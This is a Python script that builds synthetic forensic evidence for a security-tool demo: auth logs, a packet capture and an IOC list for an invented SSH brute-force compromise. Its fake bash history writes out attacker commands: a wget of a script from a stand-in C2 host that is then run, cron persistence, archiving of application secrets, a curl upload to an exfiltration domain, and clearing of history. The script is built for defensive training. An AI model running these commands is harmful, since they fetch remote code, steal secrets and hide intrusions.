"""Generate the synthetic demo evidence in data/demo/evidence/ (see data/demo/README.md).

Everything here is invented. Addresses come from the documentation ranges (RFC 5737:
198.51.100.0/24, 203.0.113.0/24) and private 10.0.0.0/8, domains use the reserved ``.example``
TLD, and no real person, host or organisation is involved. Nothing in the output is executable
malware: the "dropper" only contains ``echo`` lines and a harmless encoded PowerShell command.

The story: on 2026-09-14 an attacker at 203.0.113.45 brute-forces SSH on the web server ``web01``,
gets in as ``deploy``, becomes root, creates a backdoor account in the sudo group, downloads a
script, installs a cron job, and uploads an archive of application secrets to 198.51.100.23.

Run with the backend virtualenv (it needs ``dpkt``):

    backend/.venv/Scripts/python data/demo/make_demo.py      # Linux/macOS: backend/.venv/bin/python

The output is deterministic: running it again produces byte-identical files.
"""

from __future__ import annotations

import base64
import hashlib
import io
import struct
from datetime import UTC, datetime, timedelta
from pathlib import Path

import dpkt

OUT = Path(__file__).resolve().parent / "evidence"

HOST = "web01"
HOST_IP = "10.20.0.15"
ADMIN_IP = "10.20.0.5"
ATTACKER_IP = "203.0.113.45"
EXFIL_IP = "198.51.100.23"
DNS_IP = "10.20.0.2"
C2_DOMAIN = "cdn-update.example"
EXFIL_DOMAIN = "files.exfil-drop.example"
DAY = datetime(2026, 9, 14, tzinfo=UTC)


def at(hh: int, mm: int, ss: int = 0) -> datetime:
    return DAY + timedelta(hours=hh, minutes=mm, seconds=ss)


def iso(t: datetime) -> str:
    return t.strftime("%Y-%m-%dT%H:%M:%S+00:00")


# ---------------------------------------------------------------------- auth.log


def auth_log() -> str:
    lines: list[tuple[datetime, str]] = []

    def log(t: datetime, prog: str, msg: str) -> None:
        lines.append((t, f"{iso(t)} {HOST} {prog}: {msg}"))

    # Normal activity by the real administrator.
    log(
        at(1, 2, 11),
        "CRON[1180]",
        "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)",
    )
    log(at(1, 2, 12), "CRON[1180]", "pam_unix(cron:session): session closed for user root")
    log(
        at(1, 30, 4),
        "sshd[1201]",
        f"Accepted publickey for deploy from {ADMIN_IP} port 50122 ssh2: ED25519 SHA256:q2wD0bXaYh8ex0FJhsDk2ByGdq2v9zU0O7iu4NRnJ1c",
    )
    log(
        at(1, 30, 4),
        "sshd[1201]",
        "pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)",
    )
    log(
        at(1, 31, 40),
        "sudo",
        "  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx",
    )
    log(at(1, 44, 2), "sshd[1201]", f"Disconnected from user deploy {ADMIN_IP} port 50122")

    # 02:10-02:13 brute force: 24 attempts from the attacker against common account names.
    names = ["root", "admin", "ubuntu", "deploy", "test", "oracle"]
    t = at(2, 10, 3)
    pid = 2200
    for i in range(24):
        user = names[i % len(names)]
        port = 41000 + i * 7
        if user in ("root", "deploy"):
            log(
                t, f"sshd[{pid}]", f"Failed password for {user} from {ATTACKER_IP} port {port} ssh2"
            )
        else:
            log(t, f"sshd[{pid}]", f"Invalid user {user} from {ATTACKER_IP} port {port}")
            log(
                t + timedelta(seconds=2),
                f"sshd[{pid}]",
                f"Failed password for invalid user {user} from {ATTACKER_IP} port {port} ssh2",
            )
        t += timedelta(seconds=8)
        pid += 3

    # 02:14 the password of deploy works.
    log(
        at(2, 14, 5),
        "sshd[2290]",
        f"Accepted password for deploy from {ATTACKER_IP} port 41388 ssh2",
    )
    log(
        at(2, 14, 5),
        "sshd[2290]",
        "pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)",
    )
    log(at(2, 14, 6), "systemd-logind[612]", "New session 57 of user deploy.")
    log(
        at(2, 15, 31),
        "sudo",
        "  deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash",
    )

    # 02:21 backdoor account in the sudo group.
    log(at(2, 21, 10), "useradd[2350]", "new group: name=backupsvc, GID=1002")
    log(
        at(2, 21, 10),
        "useradd[2350]",
        "new user: name=backupsvc, UID=1002, GID=1002, home=/home/backupsvc, shell=/bin/bash, from=/dev/pts/1",
    )
    log(at(2, 21, 24), "usermod[2356]", "add 'backupsvc' to group 'sudo'")
    log(at(2, 21, 39), "passwd[2359]", "pam_unix(passwd:chauthtok): password changed for backupsvc")

    # 02:40 direct root login from the same address (root login was allowed on this host).
    log(
        at(2, 40, 12),
        "sshd[2412]",
        f"Accepted password for root from {ATTACKER_IP} port 41702 ssh2",
    )
    log(
        at(2, 40, 12),
        "sshd[2412]",
        "pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)",
    )
    log(at(2, 58, 40), "sshd[2412]", f"Disconnected from user root {ATTACKER_IP} port 41702")
    log(at(3, 4, 55), "sshd[2290]", f"Disconnected from user deploy {ATTACKER_IP} port 41388")

    # Later normal activity.
    log(
        at(7, 2, 11),
        "CRON[3301]",
        "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)",
    )
    log(at(7, 2, 12), "CRON[3301]", "pam_unix(cron:session): session closed for user root")

    lines.sort(key=lambda item: item[0])
    return "".join(text + "\n" for _, text in lines)


# ---------------------------------------------------------------------- .bash_history


def bash_history() -> str:
    """root's history (HISTTIMEFORMAT set, so every command has a ``#<epoch>`` line)."""
    commands = [
        (at(2, 15, 40), "id"),
        (at(2, 15, 44), "uname -a"),
        (at(2, 15, 52), "cat /etc/passwd"),
        (at(2, 16, 30), "ss -tlnp"),
        (at(2, 18, 2), f"wget http://{C2_DOMAIN}/x.sh -O /tmp/.x.sh"),
        (at(2, 18, 9), "chmod +x /tmp/.x.sh"),
        (at(2, 18, 12), "/tmp/.x.sh"),
        (at(2, 20, 58), "useradd -m -s /bin/bash backupsvc"),
        (at(2, 21, 24), "usermod -aG sudo backupsvc"),
        (at(2, 21, 39), "passwd backupsvc"),
        (at(2, 25, 2), '(crontab -l 2>/dev/null; echo "*/10 * * * * /tmp/.x.sh") | crontab -'),
        (at(2, 31, 17), "tar czf /tmp/.d.tgz /var/www/app/.env /var/www/app/config"),
        (at(2, 33, 40), f"curl -k -T /tmp/.d.tgz https://{EXFIL_DOMAIN}/upload"),
        (at(2, 34, 5), "rm -f /tmp/.d.tgz"),
        (at(2, 34, 20), "unset HISTFILE"),
    ]
    return "".join(f"#{int(t.timestamp())}\n{cmd}\n" for t, cmd in commands)


# ---------------------------------------------------------------------- capture.pcap


def _ip(text: str) -> bytes:
    return bytes(map(int, text.split(".")))


def _eth(ip: dpkt.Packet) -> bytes:
    return bytes(
        dpkt.ethernet.Ethernet(
            src=b"\x02\x00\x00\x00\x00\x01", dst=b"\x02\x00\x00\x00\x00\x02", type=0x0800, data=ip
        )
    )


def _ip4(src: str, dst: str, proto: int, data: dpkt.Packet) -> dpkt.ip.IP:
    pkt = dpkt.ip.IP(src=_ip(src), dst=_ip(dst), p=proto, data=data)
    pkt.len = len(bytes(pkt))
    return pkt


def _tcp(src: str, dst: str, sport: int, dport: int, flags: int, data: bytes = b"") -> bytes:
    return _eth(
        _ip4(src, dst, 6, dpkt.tcp.TCP(sport=sport, dport=dport, flags=flags, seq=1, data=data))
    )


def _dns(t: float, name: str, answer: str, qid: int) -> list[tuple[float, bytes]]:
    port = 53000 + qid % 1000
    q = dpkt.dns.DNS(id=qid, qr=dpkt.dns.DNS_Q, qd=[dpkt.dns.DNS.Q(name=name, type=1)])
    r = dpkt.dns.DNS(
        id=qid,
        qr=dpkt.dns.DNS_R,
        qd=[dpkt.dns.DNS.Q(name=name, type=1)],
        an=[dpkt.dns.DNS.RR(name=name, type=1, rdata=_ip(answer), ttl=60)],
    )
    return [
        (t, _eth(_ip4(HOST_IP, DNS_IP, 17, dpkt.udp.UDP(sport=port, dport=53, data=bytes(q))))),
        (
            t + 0.02,
            _eth(_ip4(DNS_IP, HOST_IP, 17, dpkt.udp.UDP(sport=53, dport=port, data=bytes(r)))),
        ),
    ]


def _client_hello(sni: str) -> bytes:
    name = sni.encode()
    ext = struct.pack(">HHHBH", 0, len(name) + 5, len(name) + 3, 0, len(name)) + name
    hello = (
        b"\x03\x03"
        + bytes(32)
        + b"\x00"
        + b"\x00\x02\x13\x01"
        + b"\x01\x00"
        + struct.pack(">H", len(ext))
        + ext
    )
    handshake = b"\x01" + len(hello).to_bytes(3, "big") + hello
    return b"\x16\x03\x01" + struct.pack(">H", len(handshake)) + handshake


def capture_pcap() -> bytes:
    syn, ack, psh = dpkt.tcp.TH_SYN, dpkt.tcp.TH_ACK, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH
    frames: list[tuple[float, bytes]] = []

    # 02:18:02 wget of the dropper (DNS lookup, then HTTP).
    t = at(2, 18, 2).timestamp()
    frames += _dns(t, C2_DOMAIN, ATTACKER_IP, 0x1A01)
    request = (
        f"GET /x.sh HTTP/1.1\r\nHost: {C2_DOMAIN}\r\nUser-Agent: Wget/1.21.4\r\nAccept: */*\r\n\r\n"
    )
    frames.append((t + 0.1, _tcp(HOST_IP, ATTACKER_IP, 51544, 80, syn)))
    frames.append((t + 0.2, _tcp(HOST_IP, ATTACKER_IP, 51544, 80, psh, request.encode())))
    frames.append(
        (
            t + 0.3,
            _tcp(
                ATTACKER_IP,
                HOST_IP,
                80,
                51544,
                psh,
                b"HTTP/1.1 200 OK\r\nContent-Length: 412\r\n\r\n",
            ),
        )
    )

    # 02:33:40 upload of the archive over TLS.
    t = at(2, 33, 40).timestamp()
    frames += _dns(t, EXFIL_DOMAIN, EXFIL_IP, 0x1A02)
    frames.append((t + 0.1, _tcp(HOST_IP, EXFIL_IP, 51710, 443, syn)))
    frames.append((t + 0.2, _tcp(HOST_IP, EXFIL_IP, 51710, 443, psh, _client_hello(EXFIL_DOMAIN))))
    blob = bytes((i * 37) % 251 for i in range(1400))  # stands in for encrypted application data
    record = b"\x17\x03\x03" + struct.pack(">H", len(blob)) + blob
    for i in range(40):
        frames.append((t + 0.3 + i * 0.05, _tcp(HOST_IP, EXFIL_IP, 51710, 443, psh, record)))
    frames.append((t + 2.5, _tcp(EXFIL_IP, HOST_IP, 443, 51710, ack)))

    # 02:50 and 03:00 the cron job calls home (every 10 minutes).
    for mm, port in ((50, 51802), (0, 51866)):
        t = (at(2, mm) if mm else at(3, 0)).timestamp()
        beacon = f"GET /x.sh HTTP/1.1\r\nHost: {C2_DOMAIN}\r\nUser-Agent: Wget/1.21.4\r\n\r\n"
        frames += _dns(t, C2_DOMAIN, ATTACKER_IP, 0x1A10 + mm)
        frames.append((t + 0.1, _tcp(HOST_IP, ATTACKER_IP, port, 80, syn)))
        frames.append((t + 0.2, _tcp(HOST_IP, ATTACKER_IP, port, 80, psh, beacon.encode())))

    frames.sort(key=lambda f: f[0])
    out = io.BytesIO()
    writer = dpkt.pcap.Writer(out, snaplen=65535, linktype=dpkt.pcap.DLT_EN10MB)
    for ts, frame in frames:
        writer.writepkt(frame, ts=ts)
    return out.getvalue()


# ---------------------------------------------------------------------- dropper + IOCs


def dropper() -> str:
    # The encoded command is harmless (it lists five processes); it only has the *shape* the
    # PowerShell_Encoded_Download YARA rule and the AI script explainer look for.
    encoded = base64.b64encode("Get-Process | Select-Object -First 5".encode("utf-16-le")).decode()
    return (
        "#!/bin/sh\n"
        "# Inert demo copy of /tmp/.x.sh from web01: every line only prints text.\n"
        f'echo "powershell.exe -NoProfile -WindowStyle Hidden -enc {encoded}"\n'
        f'echo "next stage: http://{C2_DOMAIN}/stage2"\n'
        "echo \"(crontab -l; echo '*/10 * * * * /tmp/.x.sh') | crontab -\"\n"
    )


def iocs_csv(dropper_sha256: str) -> str:
    rows = [
        ("ip", ATTACKER_IP, "demo: SSH brute force and dropper host", "0.9"),
        ("ip", EXFIL_IP, "demo: exfiltration endpoint", "0.9"),
        ("domain", C2_DOMAIN, "demo: dropper download host", "0.6"),
        ("domain", EXFIL_DOMAIN, "demo: exfiltration host", "0.6"),
        ("sha256", dropper_sha256, "demo: dropper script /tmp/.x.sh", "0.9"),
    ]
    return "type,value,source,confidence\n" + "".join(",".join(r) + "\n" for r in rows)


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    script = dropper().encode()
    files = {
        "auth.log": auth_log().encode(),
        ".bash_history": bash_history().encode(),
        "capture.pcap": capture_pcap(),
        "dropper.sh": script,
        "iocs.csv": iocs_csv(hashlib.sha256(script).hexdigest()).encode(),
    }
    for name, data in files.items():
        (OUT / name).write_bytes(data)
        print(f"{hashlib.sha256(data).hexdigest()}  {name}")


if __name__ == "__main__":
    main()
